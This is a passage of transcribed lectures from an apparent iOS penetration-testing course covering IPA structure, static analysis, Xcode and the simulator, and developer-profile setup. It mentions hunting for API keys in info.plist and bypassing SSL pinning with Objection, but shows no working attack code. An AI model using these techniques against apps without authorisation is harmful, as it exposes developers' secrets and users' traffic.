you're going to need a developer profile.

92
00:04:12.110 --> 00:04:14.530
And there's two different types of developer profile.

93
00:04:15.149 --> 00:04:17.690
There's the paid developer profile, this allows you

94
00:04:17.690 --> 00:04:21.410
to actually publish apps onto the Apple App

95
00:04:21.410 --> 00:04:22.010
Store, right.

96
00:04:22.270 --> 00:04:24.350
And then there's a free developer account, which

97
00:04:24.350 --> 00:04:26.510
can allow you to create your own applications

98
00:04:26.510 --> 00:04:29.490
just for testing purposes, it does not allow

99
00:04:29.490 --> 00:04:32.370
you to actually publish those applications onto the

100
00:04:32.370 --> 00:04:33.190
Apple Store.

101
00:04:34.710 --> 00:04:38.250
So you can also see in this diagram

102
00:04:38.250 --> 00:04:40.390
on the right that the file system, the

103
00:04:40.390 --> 00:04:43.870
top component here, has two partitions, right.

104
00:04:44.130 --> 00:04:47.130
There's actually a user partition, and an OS

105
00:04:47.130 --> 00:04:47.630
partition.

106
00:04:48.270 --> 00:04:50.630
And if you're familiar with an iPhone, a

107
00:04:50.630 --> 00:04:52.470
lot of the times when you're navigating through

108
00:04:52.470 --> 00:04:54.810
the file system, all you can really see

109
00:04:54.810 --> 00:04:59.350
are your user files, right, you cannot see

110
00:04:59.350 --> 00:05:01.790
files that might belong to the OS, you

111
00:05:01.790 --> 00:05:04.950
cannot really navigate through the file system and

112
00:05:04.950 --> 00:05:07.350
see like operating system files.

113
00:05:07.470 --> 00:05:10.350
That's because the file system is actually partitioned

114
00:05:10.350 --> 00:05:13.190
into two separate areas here, okay.

115
00:05:13.410 --> 00:05:15.650
So you have your user partition, which is

116
00:05:15.650 --> 00:05:18.270
used when you're navigating through like the file

117
00:05:18.270 --> 00:05:20.750
system of your phone, and you also have

118
00:05:20.750 --> 00:05:23.710
the OS partition, which is completely separate from

119
00:05:23.710 --> 00:05:24.730
the user partition.

120
00:05:25.370 --> 00:05:27.250
So that's a little bit different than Android,

121
00:05:27.890 --> 00:05:30.270
where you will not necessarily be able to

122
00:05:30.270 --> 00:05:32.490
navigate through the file system the same way.

123
00:05:33.250 --> 00:05:37.150
Again, iPhones have many hardware security features, and

124
00:05:37.150 --> 00:05:39.050
as you can see down there in the

125
00:05:39.050 --> 00:05:41.590
right hand side, the device key, group key,

126
00:05:41.950 --> 00:05:44.810
those are all keys that are actually implemented

127
00:05:44.810 --> 00:05:46.950
into the device during the manufacturing.

128
00:05:47.650 --> 00:05:50.610
So again, even things like the camera, microphone,

129
00:05:50.890 --> 00:05:53.270
etc., if you try to replace those components,

130
00:05:53.790 --> 00:05:55.570
some of them might be signed to the

131
00:05:55.570 --> 00:05:56.790
device individually.

132
00:05:57.290 --> 00:05:59.950
And that is all implemented during the manufacturing

133
00:05:59.950 --> 00:06:00.650
process.

134
00:06:00.990 --> 00:06:03.730
Actually, when you boot up your iOS device,

135
00:06:04.910 --> 00:06:07.990
it's going to be assigned a root certificate,

136
00:06:08.150 --> 00:06:10.970
this Apple root certificate, and that is going

137
00:06:10.970 --> 00:06:13.750
to actually validate that the things above that

138
00:06:13.750 --> 00:06:15.670
are all signed appropriately.

139
00:06:15.910 --> 00:06:17.410
So when you actually boot up that iPhone

140
00:06:17.410 --> 00:06:20.370
for the first time, it's actually performing physical

141
00:06:20.370 --> 00:06:23.990
checks against the keys and security features implemented

142
00:06:23.990 --> 00:06:26.010
into the phone during manufacturing.

143
00:06:26.510 --> 00:06:27.870
If you want to read more about that,

144
00:06:27.870 --> 00:06:30.410
I would definitely recommend reading the sections in

145
00:06:30.410 --> 00:06:33.850
the Mobile Pen Testing Gitbook about the iOS

146
00:06:33.850 --> 00:06:37.830
security features, and also Apple has great documentation

147
00:06:37.830 --> 00:06:40.210
on those features as well, if you want

148
00:06:40.210 --> 00:06:42.330
to read a bit more into it.

149
00:06:42.530 --> 00:06:44.050
In this course, I'm not going to go

150
00:06:44.050 --> 00:06:46.230
all the way into all those details, because

151
00:06:46.230 --> 00:06:48.010
it would take too much time to explain.

152
00:06:49.030 --> 00:06:51.590
So when it comes to static analysis for

153
00:06:51.590 --> 00:06:56.290
our iOS applications, most iOS applications are based

154
00:06:56.290 --> 00:06:59.190
on something called Objective-C, and this is

155
00:06:59.190 --> 00:07:02.150
Apple's kind of proprietary version of C that

156
00:07:02.150 --> 00:07:04.270
they have utilized for a lot of their

157
00:07:04.270 --> 00:07:07.210
different types of things they've developed.

158
00:07:07.910 --> 00:07:10.430
Now, Swift is the latest version of code

159
00:07:10.430 --> 00:07:13.390
for iOS applications, so I definitely recommend, if

160
00:07:13.390 --> 00:07:16.810
you're interested in developing iOS applications, you can

161
00:07:16.810 --> 00:07:18.390
go out there, learn a little bit of

162
00:07:18.390 --> 00:07:20.030
Swift and how it works, so you can

163
00:07:20.030 --> 00:07:22.350
gain an understanding of how an application is

164
00:07:22.350 --> 00:07:23.310
actually developed.

165
00:07:23.890 --> 00:07:26.330
Again, those applications will be developed in the

166
00:07:26.330 --> 00:07:27.510
Xcode environment.

167
00:07:28.070 --> 00:07:31.490
There are some other alternative development environments, such

168
00:07:31.490 --> 00:07:33.970
as Xamarin, but that also allows you to

169
00:07:33.970 --> 00:07:36.590
develop for Android and iOS simultaneously.

170
00:07:37.050 --> 00:07:39.610
But the main supported one by Apple is

171
00:07:39.610 --> 00:07:41.850
actually Xcode, and we'll show you how to

172
00:07:41.850 --> 00:07:44.990
install and utilize Xcode in a few videos

173
00:07:44.990 --> 00:07:45.950
in this course.

174
00:07:46.810 --> 00:07:50.230
Applications are in a .ipa format.

175
00:07:50.710 --> 00:07:52.650
This is kind of similar to the APK

176
00:07:52.650 --> 00:07:54.830
that we had for Android pen testing, right?

177
00:07:55.210 --> 00:07:58.410
The .ipa, again, is a signed bundle of

178
00:07:58.410 --> 00:08:01.750
folders, assets, everything contained for that application.

179
00:08:02.610 --> 00:08:05.190
And so what we'll demonstrate in one of

180
00:08:05.190 --> 00:08:07.590
these videos is actually how to do a

181
00:08:07.590 --> 00:08:10.230
static analysis through the file system of the

182
00:08:10.230 --> 00:08:10.830
application.

183
00:08:11.570 --> 00:08:15.630
So the .ipa contains a slash payload folder.

184
00:08:15.870 --> 00:08:18.150
We're going to be taking a .ipa, changing

185
00:08:18.150 --> 00:08:20.590
it to a zip folder, extracting things from

186
00:08:20.590 --> 00:08:22.690
that zip folder, and actually taking a look

187
00:08:22.690 --> 00:08:25.410
through the file system of the application.

188
00:08:25.630 --> 00:08:27.830
So when you unzip the .ipa, you'll get

189
00:08:27.830 --> 00:08:30.390
a slash payload folder, and that has all

190
00:08:30.390 --> 00:08:32.470
the files that you're going to need from

191
00:08:32.470 --> 00:08:34.630
a pen tester perspective to really do a

192
00:08:34.630 --> 00:08:36.830
good static analysis on the application.

193
00:08:37.610 --> 00:08:40.490
So slash payload slash application dot app, this

194
00:08:40.490 --> 00:08:43.190
is where the actual application itself is going

195
00:08:43.190 --> 00:08:46.110
to be, and that's going to also contain

196
00:08:46.110 --> 00:08:49.070
a lot of things like all the assets,

197
00:08:49.410 --> 00:08:52.550
code, json files, everything like that that the

198
00:08:52.550 --> 00:08:53.810
application needs to run.

199
00:08:54.270 --> 00:08:56.490
But also within that payload folder, there is

200
00:08:56.490 --> 00:09:00.450
an important file called slash payload slash itunes

201
00:09:00.450 --> 00:09:02.790
metadata dot plist, and this is where we're

202
00:09:02.790 --> 00:09:04.670
going to find some basic information about the

203
00:09:04.670 --> 00:09:08.050
application developer, like when the application was created,

204
00:09:08.390 --> 00:09:11.330
when it was put onto the apple store,

205
00:09:11.790 --> 00:09:15.130
and other information like that, just general information

206
00:09:15.130 --> 00:09:16.990
about the app developer that can be helpful

207
00:09:16.990 --> 00:09:19.170
for us when we go through our enumeration

208
00:09:19.170 --> 00:09:19.890
process.

209
00:09:20.890 --> 00:09:22.810
We also are going to have some files

210
00:09:22.810 --> 00:09:25.070
underneath the application dot app.

211
00:09:25.170 --> 00:09:27.110
You'll understand this when we actually do the

212
00:09:27.110 --> 00:09:29.250
static analysis video and go through the file

213
00:09:29.250 --> 00:09:29.750
system.

214
00:09:30.130 --> 00:09:32.910
The slash payload slash application dot app slash

215
00:09:32.910 --> 00:09:35.870
info dot plist, this file, the info dot

216
00:09:35.870 --> 00:09:38.230
plist file, is kind of equivalent to the

217
00:09:38.230 --> 00:09:39.970
android manifest dot xml.

218
00:09:40.370 --> 00:09:42.130
This is where we're going to find things

219
00:09:42.130 --> 00:09:44.970
like what versions of ios are supported by

220
00:09:44.970 --> 00:09:48.270
the application, as well as other important details,

221
00:09:48.410 --> 00:09:50.870
information about the developer, and other things that

222
00:09:50.870 --> 00:09:53.330
might be put into that info dot plist.

223
00:09:53.650 --> 00:09:55.910
Here we might also find things such as

224
00:09:55.910 --> 00:10:02.810
like api keys, google play api keys, or

225
00:10:02.810 --> 00:10:06.570
like firebase urls, things like that might be

226
00:10:06.570 --> 00:10:08.030
stored in the info dot plist.

227
00:10:08.390 --> 00:10:11.110
But also as we look throughout this application

228
00:10:11.110 --> 00:10:13.910
dot app folder, we'll also be looking for

229
00:10:13.910 --> 00:10:16.450
things like dot json files that might have

230
00:10:16.450 --> 00:10:19.670
configuration set up for our application, but looking

231
00:10:19.670 --> 00:10:22.290
through assets and resources that are unique to

232
00:10:22.290 --> 00:10:23.070
the application.

233
00:10:23.950 --> 00:10:26.570
So now let's go over and actually do

234
00:10:26.570 --> 00:10:31.790
a static analysis on an ipa that i've

235
00:10:31.790 --> 00:10:34.050
taken from the apple play store.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 10: iOS-Lab-Setup

WEBVTT

1
00:00:00.400 --> 00:00:02.860
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Here I am on developer.apple.com slash

2
00:00:02.860 --> 00:00:04.460
Xcode, and this is where you can find

3
00:00:04.460 --> 00:00:07.600
a lot of really good documentation about Xcode

4
00:00:07.600 --> 00:00:08.980
and how to use it if you've never

5
00:00:08.980 --> 00:00:09.820
used it before.

6
00:00:10.140 --> 00:00:11.420
It tells you about a lot of the

7
00:00:11.420 --> 00:00:13.180
different things that Xcode is going to have

8
00:00:13.180 --> 00:00:15.120
within it, and if you scroll all the

9
00:00:15.120 --> 00:00:16.700
way down to the bottom here you can

10
00:00:16.700 --> 00:00:19.740
go to the Xcode documentation and read all

11
00:00:19.740 --> 00:00:21.320
about the different types of things that you

12
00:00:21.320 --> 00:00:23.040
can do with Xcode and how to use

13
00:00:23.040 --> 00:00:24.060
this tool properly.

14
00:00:24.640 --> 00:00:25.760
We're not going to go into the depths

15
00:00:25.760 --> 00:00:27.120
of that, but I did want to give

16
00:00:27.120 --> 00:00:29.040
that to you as a resource in case

17
00:00:29.040 --> 00:00:30.760
you wanted to go out and learn more

18
00:00:30.760 --> 00:00:32.540
about how Xcode actually works.

19
00:00:33.220 --> 00:00:34.840
Now to download this all you need to

20
00:00:34.840 --> 00:00:37.100
do is open the app store on your

21
00:00:37.100 --> 00:00:39.140
Mac device, and you're just going to have

22
00:00:39.140 --> 00:00:41.600
to do a quick search here for Xcode.

23
00:00:43.840 --> 00:00:46.380
Okay, and here is Xcode on the Apple

24
00:00:46.380 --> 00:00:46.860
Store.

25
00:00:47.160 --> 00:00:48.740
You can find it right here.

26
00:00:48.840 --> 00:00:50.080
If you wanted to read more about it

27
00:00:50.080 --> 00:00:51.740
you can click it, and you can just

28
00:00:51.740 --> 00:00:53.640
download the cloud icon here.

29
00:00:54.080 --> 00:00:55.480
Now you can see that here it says

30
00:00:55.480 --> 00:00:59.500
requires Mac OS 11.3 or later, so

31
00:00:59.500 --> 00:01:00.920
for me this is not going to work

32
00:01:00.920 --> 00:01:03.220
because I'm an old version of Mac OS

33
00:01:03.220 --> 00:01:05.700
that is no longer supported by Xcode.

34
00:01:06.280 --> 00:01:08.440
So depending on which version of a Mac

35
00:01:08.440 --> 00:01:10.160
that you're using you may or may not

36
00:01:10.160 --> 00:01:12.220
be able to download this from the Apple

37
00:01:12.220 --> 00:01:13.320
Store just like this.

38
00:01:13.900 --> 00:01:15.340
Now if you are like me and you

39
00:01:15.340 --> 00:01:17.320
have an old version of Mac OS that's

40
00:01:17.320 --> 00:01:20.040
no longer supported you can still get older

41
00:01:20.040 --> 00:01:22.860
versions of this from the developer.apple.com

42
00:01:22.860 --> 00:01:25.380
website, and all you need to do is

43
00:01:25.380 --> 00:01:27.400
scroll up to the top here, click account,

44
00:01:27.900 --> 00:01:29.580
and then you're going to sign in with

45
00:01:29.580 --> 00:01:30.520
your Apple ID.

46
00:01:32.000 --> 00:01:33.340
So I'm going to do that right here,

47
00:01:33.540 --> 00:01:35.940
and then go into the actual Xcode download

48
00:01:35.940 --> 00:01:39.860
area to download an older version of Xcode.

49
00:01:43.500 --> 00:01:45.760
Okay, so here I am signed into the

50
00:01:45.760 --> 00:01:47.740
developer.apple.com website.

51
00:01:47.920 --> 00:01:49.040
You may need to sign up for an

52
00:01:49.040 --> 00:01:50.660
account if you do not have a developer

53
00:01:50.660 --> 00:01:51.280
account.

54
00:01:51.640 --> 00:01:53.800
You can use that with any iCloud account

55
00:01:53.800 --> 00:01:55.200
that you want to, so as long as

56
00:01:55.200 --> 00:01:57.560
you have an email address associated to an

57
00:01:57.560 --> 00:02:00.220
iCloud account you can also make that into

58
00:02:00.220 --> 00:02:01.400
a developer account.

59
00:02:01.700 --> 00:02:04.540
I'm going to go to downloads here, and

60
00:02:04.540 --> 00:02:05.960
this is where we're going to download our

61
00:02:05.960 --> 00:02:07.400
older version of Xcode.

62
00:02:07.560 --> 00:02:09.120
I'm going to scroll down a bit more

63
00:02:09.120 --> 00:02:11.840
and find Xcode here.

64
00:02:20.150 --> 00:02:22.050
So I'm going to click, what I clicked

65
00:02:22.050 --> 00:02:24.770
here was Xcode beta 13, and I'm going

66
00:02:24.770 --> 00:02:27.890
to scroll down here to other versions of

67
00:02:27.890 --> 00:02:28.350
Xcode.

68
00:02:28.450 --> 00:02:29.870
So you can see the command line tools

69
00:02:29.870 --> 00:02:31.370
and older versions of Xcode.

70
00:02:31.710 --> 00:02:43.270
I'm going to click that, and

71
00:02:43.270 --> 00:02:44.750
I'm going to go down to the version

72
00:02:44.750 --> 00:02:46.330
of Xcode that's going to work for me,

73
00:02:46.410 --> 00:02:49.050
which I think is version like 12 or

74
00:02:49.050 --> 00:02:49.790
something like that.

75
00:02:57.490 --> 00:02:58.710
Probably this should work.

76
00:02:59.710 --> 00:03:01.370
I'm going to download the zip file, extract

77
00:03:01.370 --> 00:03:04.270
it, and then run the application when this

78
00:03:04.270 --> 00:03:06.770
is done downloading, and I'll be back after

79
00:03:06.770 --> 00:03:08.010
this installs successfully.

80
00:03:08.490 --> 00:03:11.650
If you just downloaded Xcode from the App

81
00:03:11.650 --> 00:03:13.570
Store, just join me in the next part

82
00:03:13.570 --> 00:03:14.930
of the video where I'm going to be

83
00:03:14.930 --> 00:03:18.930
showing the features of Xcode just generally speaking.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:02.510
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, so here I am in the Xcode

2
00:00:02.510 --> 00:00:03.690
main menu.

3
00:00:03.910 --> 00:00:05.870
Let's go through a couple of the good

4
00:00:05.870 --> 00:00:07.370
features about Xcode.

5
00:00:07.650 --> 00:00:09.310
I'm just going to click create a new

6
00:00:09.310 --> 00:00:10.690
Xcode project here.

7
00:00:12.930 --> 00:00:14.970
Okay, and I'm just going to do a

8
00:00:14.970 --> 00:00:15.970
single view app.

9
00:00:16.090 --> 00:00:17.630
Now if you were an app developer, you

10
00:00:17.630 --> 00:00:19.570
would obviously go through a lot of these

11
00:00:19.570 --> 00:00:22.110
different types of apps you can have.

12
00:00:22.270 --> 00:00:24.770
You can see games, document-based apps, things

13
00:00:24.770 --> 00:00:25.310
like that.

14
00:00:25.670 --> 00:00:27.110
For this case, I'm just going to do

15
00:00:27.110 --> 00:00:28.350
a single view app.

16
00:00:28.390 --> 00:00:30.270
I'm going to click next, and I'm just

17
00:00:30.270 --> 00:00:34.950
going to name this hello world 5, I

18
00:00:34.950 --> 00:00:35.230
guess.

19
00:00:35.390 --> 00:00:37.590
I've had a couple of hello world applications

20
00:00:37.590 --> 00:00:39.010
that I've made, so just make sure that

21
00:00:39.010 --> 00:00:40.510
this one is uniquely named.

22
00:00:41.070 --> 00:00:42.910
Okay, you can see here that there's going

23
00:00:42.910 --> 00:00:43.990
to be a team option.

24
00:00:44.770 --> 00:00:47.050
Now when you use this, it might actually

25
00:00:47.050 --> 00:00:47.770
say none.

26
00:00:48.210 --> 00:00:49.690
To be able to get the team, you're

27
00:00:49.690 --> 00:00:51.670
going to have to make a development team

28
00:00:51.670 --> 00:00:56.930
within Xcode, so we'll set that up in

29
00:00:56.930 --> 00:00:58.690
this video as well at the very end,

30
00:00:58.810 --> 00:01:00.870
but for now let's just call our product

31
00:01:00.870 --> 00:01:03.550
name hello world or hello world 5 or

32
00:01:03.550 --> 00:01:04.370
something like that.

33
00:01:05.210 --> 00:01:07.190
My organisation name is going to be the

34
00:01:07.190 --> 00:01:08.090
name of my computer.

35
00:01:08.630 --> 00:01:10.790
Organisation identifier is just WilsonSec.

36
00:01:10.890 --> 00:01:12.150
You might need to set up a little

37
00:01:12.150 --> 00:01:13.350
bit of that when you do this for

38
00:01:13.350 --> 00:01:14.030
the first time.

39
00:01:14.210 --> 00:01:15.610
I'm going to click next here.

40
00:01:19.630 --> 00:01:21.670
Okay, and it's going to create a new

41
00:01:21.670 --> 00:01:24.890
repository on our Mac, and this is where

42
00:01:24.890 --> 00:01:26.790
all of our project details are going to

43
00:01:26.790 --> 00:01:29.650
be saved, and if you're working on this

44
00:01:29.650 --> 00:01:33.310
on iOS penetration testing in a big organisation

45
00:01:33.310 --> 00:01:36.310
or with developers, they'll have these things that

46
00:01:36.310 --> 00:01:39.150
are called Xcode projects, and if you are

47
00:01:39.150 --> 00:01:41.170
a penetration tester, one of the best things

48
00:01:41.170 --> 00:01:42.710
that you can get your hands on is

49
00:01:42.710 --> 00:01:44.250
actually that Xcode project.

50
00:01:44.850 --> 00:01:47.510
So if you're working with a development team,

51
00:01:47.610 --> 00:01:50.290
you can always ask them for that kind

52
00:01:50.290 --> 00:01:53.270
of a file as opposed to the IPA

53
00:01:53.270 --> 00:01:54.910
file that we pulled off of the Apple

54
00:01:54.910 --> 00:01:55.290
Store.

55
00:01:55.690 --> 00:01:58.030
Now we can always, you know, still do

56
00:01:58.030 --> 00:02:01.410
our job with either of the application types,

57
00:02:01.550 --> 00:02:03.350
but the Xcode project is going to have

58
00:02:03.350 --> 00:02:06.150
a lot more details and a lot more

59
00:02:06.150 --> 00:02:08.949
information about the application that you'll be able

60
00:02:08.949 --> 00:02:11.290
to actually, you know, take a look at

61
00:02:11.290 --> 00:02:11.850
with Xcode.

62
00:02:11.950 --> 00:02:13.490
It'll actually have like all the source code

63
00:02:13.490 --> 00:02:15.210
and everything in there, so if you are

64
00:02:15.210 --> 00:02:17.950
working with a developer or some kind of

65
00:02:17.950 --> 00:02:20.750
an organisation, try to get the Xcode project

66
00:02:20.750 --> 00:02:23.690
or the Xcode workspace file to be able

67
00:02:23.690 --> 00:02:25.190
to do your analysis with.

68
00:02:25.630 --> 00:02:26.790
In this case, I'm just going to click

69
00:02:26.790 --> 00:02:28.810
create to create this new application.

70
00:02:37.310 --> 00:02:39.330
Okay, and so here is pretty much our

71
00:02:39.330 --> 00:02:40.310
Xcode workspace.

72
00:02:40.510 --> 00:02:41.630
I think it's going to load in some

73
00:02:41.630 --> 00:02:44.850
things here, but as just normal nodes for

74
00:02:44.850 --> 00:02:47.410
penetration testers, we're going to be using this

75
00:02:47.410 --> 00:02:50.050
top section up here for a lot of

76
00:02:50.050 --> 00:02:51.970
our tools and things like that as we're

77
00:02:51.970 --> 00:02:53.090
interacting with Xcode.

78
00:02:53.230 --> 00:02:56.110
So here we are with the application source

79
00:02:56.110 --> 00:02:57.990
code that has been kind of pre-developed

80
00:02:57.990 --> 00:02:58.170
here.

81
00:02:58.350 --> 00:03:02.030
Whenever we make a one UI application, it's

82
00:03:02.030 --> 00:03:05.570
going to automatically create some elements here, and

83
00:03:05.570 --> 00:03:07.870
for example, this application, when we run it,

84
00:03:08.050 --> 00:03:09.810
it's going to just say hello world.

85
00:03:10.390 --> 00:03:12.410
Now as pen testers, if we're able to

86
00:03:12.410 --> 00:03:14.910
actually get the Xcode project, we'll be able

87
00:03:14.910 --> 00:03:18.770
to look through the source code here, and

88
00:03:18.770 --> 00:03:20.130
we can also do this kind of when

89
00:03:20.130 --> 00:03:23.170
we decompile the application as well, but you

90
00:03:23.170 --> 00:03:25.390
can see here there's like an info.plist

91
00:03:25.390 --> 00:03:25.790
file.

92
00:03:26.130 --> 00:03:28.190
Now this is kind of where a lot

93
00:03:28.190 --> 00:03:30.890
of the information is stored for an iOS

94
00:03:30.890 --> 00:03:33.410
application that is similar to an Android one,

95
00:03:33.510 --> 00:03:35.910
so it's kind of like the Android manifest

96
00:03:35.910 --> 00:03:38.050
.xml, but for an iPhone.

97
00:03:38.450 --> 00:03:40.690
You can see we have a few strings

98
00:03:40.690 --> 00:03:42.190
shown here.

99
00:03:42.310 --> 00:03:47.110
We have bundle identifiers, executable file names, things

100
00:03:47.110 --> 00:03:47.650
like that.

101
00:03:47.890 --> 00:03:50.570
The version of iOS that this would be

102
00:03:50.570 --> 00:03:52.990
supporting, everything like that would be defined in

103
00:03:52.990 --> 00:03:54.870
the info.plist. You can see there's a

104
00:03:54.870 --> 00:03:56.670
few of them here, so you just want

105
00:03:56.670 --> 00:03:58.530
to kind of look through those to familiarise

106
00:03:58.530 --> 00:03:59.670
yourself with this.

107
00:04:00.850 --> 00:04:04.210
Okay, other useful tools for Xcode is we

108
00:04:04.210 --> 00:04:07.830
can go here to the Xcode on the

109
00:04:07.830 --> 00:04:09.290
top bar here.

110
00:04:09.510 --> 00:04:11.610
We're going to go to open developer tool,

111
00:04:11.690 --> 00:04:13.770
and we're going to click simulator, and this

112
00:04:13.770 --> 00:04:18.730
is essentially our simulated iPhones for a MacBook,

113
00:04:19.010 --> 00:04:19.190
right?

114
00:04:19.570 --> 00:04:21.310
So we're going to have a choice of

115
00:04:21.310 --> 00:04:24.930
creating simulators here, different types of simulators for

116
00:04:24.930 --> 00:04:26.130
our iOS device.

117
00:04:26.210 --> 00:04:27.570
You can see that I have it selected

118
00:04:27.570 --> 00:04:28.190
down here.

119
00:04:28.270 --> 00:04:29.170
You're going to have to click here.

120
00:04:29.950 --> 00:04:31.950
In this case, it's booting up an iPhone

121
00:04:31.950 --> 00:04:34.690
SE, but if you want to add other

122
00:04:34.690 --> 00:04:37.290
devices as well, you can go here, go

123
00:04:37.290 --> 00:04:40.690
to open device, like file, open device, then

124
00:04:40.690 --> 00:04:42.830
you can select from the variety of devices

125
00:04:42.830 --> 00:04:43.730
that are available.

126
00:04:44.170 --> 00:04:46.090
I also believe it might be possible to

127
00:04:46.090 --> 00:04:49.110
download new ones, but Xcode does a really

128
00:04:49.110 --> 00:04:51.970
good job of having a variety of devices

129
00:04:51.970 --> 00:04:52.610
right here.

130
00:04:53.750 --> 00:04:55.150
So you don't really have to worry about

131
00:04:55.150 --> 00:04:56.250
it as much as Android.

132
00:04:56.290 --> 00:04:57.910
We need to download all the different types

133
00:04:57.910 --> 00:04:58.410
of devices.

134
00:04:58.410 --> 00:05:00.630
You can pretty much just select one and

135
00:05:00.630 --> 00:05:01.330
see it running.

136
00:05:01.410 --> 00:05:02.530
So if I wanted to see an Apple

137
00:05:02.530 --> 00:05:04.790
TV or an Apple Watch, see how my

138
00:05:04.790 --> 00:05:05.770
application differs.

139
00:05:06.330 --> 00:05:08.250
In terms of size, it's all there.

140
00:05:08.870 --> 00:05:12.690
Other options for the simulator is we can

141
00:05:12.690 --> 00:05:14.210
go to the device tab here.

142
00:05:14.590 --> 00:05:16.450
You can see you can restart the device.

143
00:05:16.630 --> 00:05:18.810
You can erase all the content and settings

144
00:05:18.810 --> 00:05:20.250
if you need to start clean from the

145
00:05:20.250 --> 00:05:20.630
device.

146
00:05:21.050 --> 00:05:23.170
You can rotate it and change the orientation

147
00:05:23.170 --> 00:05:24.270
however you need to.

148
00:05:24.590 --> 00:05:26.750
You can also send some commands to it

149
00:05:26.750 --> 00:05:29.230
here, like home and lock button and using

150
00:05:29.230 --> 00:05:30.510
Siri, things like that.

151
00:05:31.030 --> 00:05:33.250
So that can be useful sometimes when we

152
00:05:33.250 --> 00:05:34.850
need to restart the device, we need to

153
00:05:34.850 --> 00:05:36.810
do some device troubleshooting, etc.

154
00:05:37.630 --> 00:05:39.610
Also if we go to the I.O.

155
00:05:39.710 --> 00:05:42.490
here, we have the option to send keyboard

156
00:05:42.490 --> 00:05:43.710
inputs to the device.

157
00:05:43.930 --> 00:05:46.230
You can change the audio input and output

158
00:05:46.230 --> 00:05:48.470
if we're testing certain things for the application.

159
00:05:49.070 --> 00:05:51.430
You can also do some external display stuff

160
00:05:51.430 --> 00:05:51.730
here.

161
00:05:53.750 --> 00:05:56.690
Also there is the debug screen here.

162
00:05:56.770 --> 00:05:58.870
You can open the system log here under

163
00:05:58.870 --> 00:06:01.910
debug, open system log, and this can also

164
00:06:01.910 --> 00:06:04.830
sometimes be helpful for us if we're trying

165
00:06:04.830 --> 00:06:07.170
to see if our application is erroring for

166
00:06:07.170 --> 00:06:09.210
any reason, or if we're trying to see

167
00:06:09.210 --> 00:06:12.730
if the application isn't locking anything sensitive in

168
00:06:12.730 --> 00:06:14.090
here in the system log.

169
00:06:14.370 --> 00:06:16.130
So kind of similar to what we did

170
00:06:16.130 --> 00:06:17.690
with the Android as well.

171
00:06:20.360 --> 00:06:23.000
Besides that, we could also just interact with

172
00:06:23.000 --> 00:06:24.180
our emulator here.

173
00:06:24.300 --> 00:06:28.260
Our simulator seems to be possibly stuck right

174
00:06:28.260 --> 00:06:28.640
now.

175
00:06:32.350 --> 00:06:34.830
I'll try to build this application on there,

176
00:06:35.110 --> 00:06:38.770
click the run button, should build it, and

177
00:06:38.770 --> 00:06:40.570
we should see hello world pop up in

178
00:06:40.570 --> 00:06:41.050
our simulator.

179
00:06:41.210 --> 00:06:42.850
Oh there we go, the iPhone is starting

180
00:06:42.850 --> 00:06:43.350
up now.

181
00:06:51.660 --> 00:06:55.160
Now the bad part about simulators, as far

182
00:06:55.160 --> 00:06:58.000
as I can tell, you cannot drag and

183
00:06:58.000 --> 00:07:00.780
drop an IPA file onto it to run

184
00:07:00.780 --> 00:07:00.960
it.

185
00:07:01.560 --> 00:07:04.080
Like what we did with the Android pen

186
00:07:04.080 --> 00:07:07.020
testing section, when we were using our emulator,

187
00:07:07.140 --> 00:07:08.640
we were able to just drag and drop

188
00:07:08.640 --> 00:07:10.980
applications over to the iPhone, right?

189
00:07:11.460 --> 00:07:13.520
But in this case, I'm pretty sure that

190
00:07:13.520 --> 00:07:16.560
the simulator cannot really be used for anything

191
00:07:16.560 --> 00:07:19.740
besides just running like one application.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.200 --> 00:00:02.760
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's talk now about how we can

2
00:00:02.760 --> 00:00:06.140
get a developer profile for our Mac.

3
00:00:06.800 --> 00:00:08.780
So the reason why we're going to need

4
00:00:08.780 --> 00:00:11.460
a developer profile is when we're rebuilding an

5
00:00:11.460 --> 00:00:14.760
application using Objection, so we can do our

6
00:00:14.760 --> 00:00:17.620
dynamic analysis, we're going to need to sign

7
00:00:17.620 --> 00:00:21.440
the application using an Apple developer licence.

8
00:00:22.180 --> 00:00:24.020
And how we're going to get here is

9
00:00:24.020 --> 00:00:27.300
I'm going to open Xcode, so right here

10
00:00:27.300 --> 00:00:27.980
is Xcode.

11
00:00:27.980 --> 00:00:30.400
You can go to Xcode here and then

12
00:00:30.400 --> 00:00:33.940
go to Preferences, and here it's going to

13
00:00:33.940 --> 00:00:36.620
open up a tonne of different things here.

14
00:00:36.700 --> 00:00:38.780
There's a General tab, Behaviours, et cetera.

15
00:00:39.260 --> 00:00:41.640
You can change all kinds of stuff in

16
00:00:41.640 --> 00:00:43.760
here in terms of your preferences for Xcode.

17
00:00:44.240 --> 00:00:45.740
But here we're just going to be talking

18
00:00:45.740 --> 00:00:47.340
about this Accounts tab.

19
00:00:47.680 --> 00:00:49.460
I'm going to click the plus button to

20
00:00:49.460 --> 00:00:50.840
add a new account.

21
00:00:51.380 --> 00:00:53.560
I'm going to do Apple ID, and you're

22
00:00:53.560 --> 00:00:55.520
going to need to have an Apple ID

23
00:00:55.520 --> 00:00:56.760
to do this successfully.

24
00:00:56.760 --> 00:00:59.380
And this is going to, again, help us

25
00:00:59.380 --> 00:01:01.760
to sign an application with some changes.

26
00:01:02.320 --> 00:01:04.780
So for example, using Objection, we could bypass

27
00:01:04.780 --> 00:01:07.900
SSL pinning, we could also make our own

28
00:01:07.900 --> 00:01:11.120
applications and publish it to our iPhone device

29
00:01:11.120 --> 00:01:13.500
while we have it physically connected to our

30
00:01:13.500 --> 00:01:13.860
MacBook.

31
00:01:14.380 --> 00:01:16.420
So I'm going to click Apple ID here,

32
00:01:16.540 --> 00:01:18.980
click Continue, I'm going to sign into my

33
00:01:18.980 --> 00:01:20.020
Apple ID now.

34
00:01:41.840 --> 00:01:44.580
Okay, and here you can actually see that

35
00:01:44.580 --> 00:01:47.900
I'm signed in with my Apple ID, and

36
00:01:47.900 --> 00:01:55.300
here I have a team on my profile.

37
00:01:56.540 --> 00:02:01.100
But okay, so here you can see that

38
00:02:01.100 --> 00:02:03.400
I'm signed in with my Apple ID, and

39
